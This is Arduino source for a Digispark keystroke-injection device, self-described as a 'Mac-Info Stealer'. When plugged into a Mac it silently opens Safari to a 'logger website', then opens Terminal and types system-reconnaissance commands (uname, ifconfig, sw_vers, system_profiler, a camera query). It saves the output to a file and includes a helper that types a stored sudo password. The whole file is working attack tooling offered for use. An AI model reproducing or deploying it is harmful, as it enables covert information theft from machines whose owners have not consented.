//###################################################
/*
 * By the Lin8x Dev Team
 */
//###################################################
/*
*
* Things to know if you want to add code:
* - Unix Terminal Commands
* - Keyboard Shortcuts for Mac
*
*/
//###################################################
/*
* Welcome to the Mac-Info Stealer Digispark Codeline!
* 
* Heres the process of the code:
* 1. Open spotlight
* 2. Open safari
* 3. Go to logger website
* 4. Close Website
* 5. Open spotlight
* 6. Open up terminal
* 7. Gain system information w/ commands
* 8. Save Output into file named lin8x
* 
* Custom Functions:
* spotlight("{application}") - Opens spotlight to open any application
* Ex: spotlight("Application");
* 
* command("{mac terminal command}") - Enters a command in a terminal
* Ex: command("ls");
* 
* superCommand("sudo {mac terminal command}") - Enters a command that requires sudo. must have password.
* 
* website("{website}") - Opens the spotlight to safari and enters a website to go to
* Ex: website("https://www.github.com/lin8x/");
* 
*/
//###################################################

//Includes all the definitions and requirements
#include "DigiKeyboard.h"
#define MOD_CMD_LEFT 0x00000008 //Define the CMD
#define KEY_UP_ARROW   0x52 // Define the Up Arrow
#define KEY_DOWN_ARROW   0x51 // Define the Down Arrow
#define KEY_LEFT_ARROW   0x50 // Define the Left Arrow
#define KEY_RIGHT_ARROW   0x4F // Define the Right Arrow
String password = "PASSWORD"; // User's password if you want to do a sudo command

//###################################################

void setup() //setup area
{

    DigiKeyboard.update();

    //Minimize open window
    DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT | MOD_CONTROL_LEFT);

    //Goes to logger website
    web("google.com");
    
    //Open spotlight to terminal application
    spotlight("terminal");

    //Commands in terminal
    command("clear");
    command("ls");
    command("uname");
    command("uname -n");
    command("uname -v");
    command("uname -r");
    command("uname -m");
    command("uname -a");
    command("ifconfig"); //Lists 
    command("sw_vers"); //Lists software versions
    command("system_profiler"); //Lists all hardware info
    delay(10000);
    DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
    command("system_profiler SPCameraDataType");

    //Save terminal output into file
    DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT);
    DigiKeyboard.print("lin8x.txt"); 
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    
}

//###################################################

void loop() //loop area
{
  
    // When scripts are done, blink,
    digitalWrite(1, HIGH);
    delay(200);
    digitalWrite(1, LOW);
    delay(300);

}

//###################################################

void command(String cmd) //Type command in terminal
{
    DigiKeyboard.print(cmd);
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(400);
}


//###################################################

void superCommand(String cmd) //Type a sudo command in terminal
{
    DigiKeyboard.print(cmd);
    DigiKeyboard.delay(400);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(400);
    DigiKeyboard.print(password);
    DigiKeyboard.delay(400);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT); 
}

//###################################################

void spotlight(String application) //Function to open spotlight
{
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);//CMD + SPACE to open spotlight
    DigiKeyboard.delay(400);
    
    DigiKeyboard.print(application); //Application Parameter that was set
    DigiKeyboard.delay(400);

    DigiKeyboard.sendKeyStroke(KEY_ENTER); //ENTER key
    DigiKeyboard.delay(400);
}

//###################################################

void web(String website)
{
  
    spotlight("safari"); //Opens spotlight to safari application

    DigiKeyboard.sendKeyStroke(KEY_T, MOD_GUI_LEFT);//CMD + T to open a new tab in safari, just incase
    delay(400);
    DigiKeyboard.print(website); //PRINT WEBSITE
    delay(400);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(4000);
    DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);//CMD + W to close a new tab in safari, just incase
    
}

//###################################################
